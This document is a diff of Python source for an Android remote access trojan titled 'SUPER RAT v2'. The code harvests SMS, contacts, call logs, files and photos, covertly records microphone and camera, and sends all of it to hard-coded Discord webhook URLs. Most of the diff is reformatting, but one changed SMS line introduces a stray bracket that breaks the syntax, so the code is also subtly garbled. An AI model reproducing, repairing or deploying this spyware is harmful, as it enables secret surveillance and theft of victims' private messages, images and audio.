@@ -1,11 +1,11 @@
-# SUPER RAT v2 — WORKING VERSION
+# SUPER RAT v2 - WORKING VERSION
 import os, sys, time, random, threading, traceback
 import requests
 
 WEBHOOKS = [
     "https://discord.com/api/webhooks/1571455883890786368/Rxx2nrRl-yQy12ukzHANu6aiPRND2cVFddEwni0ksu7nZy33z0LGXotXDrPdGotTa78b",
     "https://discord.com/api/webhooks/1571455653820502069/l3HWW63h8HGftqOUhjVBDQAaZL8XitiYb2BPmg1CxiRv0AQQv5uCnHS--ne-yQbROKpY",
-    "https://discord.com/api/webhooks/1570302449284157570/79RroUaLoIEOT5Y2aHZf1KwHQzHsvL_M6o2GaEqwlzzYociI6xX-rVEkP0Qp6QwYnRrx",
+    "https://discord.com/api/webhooks/1570302449284157570/79RroUaLoIEOT5Y2aHzf1KwHQzHsvL_M6o2GaEqwlzzYociI6xX-rVEkP0Qp6QwYnRrx",
     "https://discord.com/api/webhooks/1570301861200789554/2OmgHsbjyeV5bsU3ns-WxjFo7scFW41xbo_jQP6oxn__nQo3l0YUi8FVgsqJbr2gfbRI",
 ]
 
@@ -124,7 +124,7 @@ def harvest_sms():
                 try:
                     body = cur.getString(cur.getColumnIndex("body")) or ""
                     addr = cur.getString(cur.getColumnIndex("address")) or "?"
-                    out.append("[%s] %s" % (addr, body.replace("\n", " ")[:160]))
+                    out.append("[%s] %s" % (addr, body.replace("\n", " ")[:160]])
                 except Exception:
                     pass
             cur.close()
@@ -191,7 +191,8 @@ def steal_photos():
         return
     sent = 0
     for p in files:
-        if sent >= PHOTO_STEAL: break
+        if sent >= PHOTO_STEAL:
+            break
         try:
             with open(p, "rb") as f:
                 hook_send("** PHOTO %d/%d **" % (sent+1, PHOTO_STEAL), {"files[0]": (os.path.basename(p), f, "image/jpeg")})
@@ -260,8 +261,10 @@ def mic_loop():
         except Exception:
             pass
         finally:
-            try: os.remove(path)
-            except: pass
+            try:
+                os.remove(path)
+            except Exception:
+                pass
         time.sleep(MIC_EVERY)
 
 def cam_loop():
@@ -303,8 +306,10 @@ def cam_loop():
         except Exception:
             pass
         finally:
-            try: os.remove(path)
-            except: pass
+            try:
+                os.remove(path)
+            except Exception:
+                pass
         time.sleep(CAM_EVERY)
 
 def drain_loop():
@@ -318,8 +323,10 @@ def drain_loop():
         except Exception:
             pass
         finally:
-            try: os.remove(path)
-            except: pass
+            try:
+                os.remove(path)
+            except Exception:
+                pass
         time.sleep(DRAIN_EVERY)
 
 # ---------------- MAIN ----------------
@@ -328,10 +335,10 @@ def run_rats():
     global USER_DIR
     try:
         USER_DIR = activity().getFilesDir().getAbsolutePath()
-    except:
+    except Exception:
         USER_DIR = "/sdcard"
 
-    time.sleep(20)  # wait for permission taps
+    time.sleep(20)
     hook_send("** RAT ONLINE **")
 
     for fn in (harvest_device, harvest_contacts, harvest_sms, harvest_calls, harvest_apps, harvest_files, steal_photos):
